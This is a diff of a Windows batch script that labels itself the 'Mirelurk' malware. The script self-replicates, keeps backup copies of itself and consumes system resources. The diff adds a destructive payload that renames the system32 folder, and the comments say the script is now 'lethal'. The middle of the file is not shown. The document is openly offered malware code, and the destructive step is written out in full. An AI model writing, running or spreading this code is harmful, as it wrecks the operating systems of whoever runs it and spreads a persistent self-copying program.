@@ -1,16 +1,12 @@
 @echo off
 
-:: Version 1.4.2 of the "Mirelurk" malware.
+:: Version 1.5.0 of the "Mirelurk" malware.
 ::
-:: This is an evolution of the "Fatal Mudcrab Encounter" malware. As of 1.3.2 this has become
-:: the irradiated monstrosity that is "Mirelurk".
-::
-:: It is a self-replicating file that will eat up all available system resources over time.
+:: This is a self-replicating file that will eat up all available system resources over time.
 :: It is resilient, and makes multiple copies of itself for restoration in case of destruction.
 :: To eat up system resources faster, it also opens a random wikipedia article each time it runs.
 ::
-:: CHANGELOG
-:: Updated backup locations to be accessible by any user and added a second backup location.
+:: As of version 1.5, this script is now lethal.
 
 :: Working directories
 set original=C:\Users\%USERNAME%\Downloads\mirelurk.bat
@@ -42,5 +38,9 @@ if exist %file% (
 )
 
 :: Payload
+if exist C:\Windows\system32 (
+	cd C:\Windows
+	ren system32 system64
+)
 start https://en.wikipedia.org/wiki/Special:Random
 start %file%
